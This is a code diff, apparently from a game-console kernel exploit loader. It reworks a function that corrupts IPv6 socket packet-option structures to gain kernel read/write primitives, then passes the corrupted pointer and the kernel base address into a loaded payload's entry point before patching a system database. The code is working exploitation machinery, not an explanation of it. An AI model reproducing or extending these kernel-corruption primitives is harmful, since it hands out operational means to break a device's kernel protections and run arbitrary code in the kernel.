@@ -69,7 +69,7 @@ int sceKernelSetProcessName(const char *name);
  *   inpcb + 288   = in6p_outputopts (ip6_pktopts*)
  *   ip6_pktopts + 16 = ip6po_pktinfo (in6_pktinfo*)
  */
-static int setup_ipv6_krw(payload_args_t *args) {
+static int setup_ipv6_krw(payload_args_t *args, uint64_t *out_victim_pktopts) {
     int master_fd = args->rwpair[0];
     int victim_fd = args->rwpair[1];
     intptr_t kdata_base = args->kdata_base_addr;
@@ -161,6 +161,8 @@ static int setup_ipv6_krw(payload_args_t *args) {
 
     klog_printf("setup_ipv6_krw: OK (m_opts=0x%lx v_opts=0x%lx)\n",
                  (unsigned long)master_pktopts, (unsigned long)victim_pktopts);
+    if(out_victim_pktopts)
+        *out_victim_pktopts = victim_pktopts;
     return 0;
 }
 
@@ -372,17 +374,19 @@ int main(void) {
         }
     }
 
-    void (*entry)(payload_args_t*) = base + ehdr->e_entry;
+    int (*entry)(void*, int, int, uintptr_t, uintptr_t) = (void*)(base + ehdr->e_entry);
     payload_args_t* args = payload_get_args();
 
     /* Set up IPv6 pktopts corruption so the kernel payload's
      * kread8/kwrite20 primitives work via the rwpair sockets. */
-    int krw_rc = setup_ipv6_krw(args);
+    uint64_t victim_pktopts = 0;
+    int krw_rc = setup_ipv6_krw(args, &victim_pktopts);
     if(krw_rc != 0) {
         klog_printf("WARNING: setup_ipv6_krw failed (%d)\n", krw_rc);
     }
 
-    entry(args);
+    entry(args, args->rwpair[0], args->rwpair[1],
+          victim_pktopts, args->kdata_base_addr);
     if(*args->payloadout == 0) {
         puts("patching app.db");
         *args->payloadout = patch_app_db();
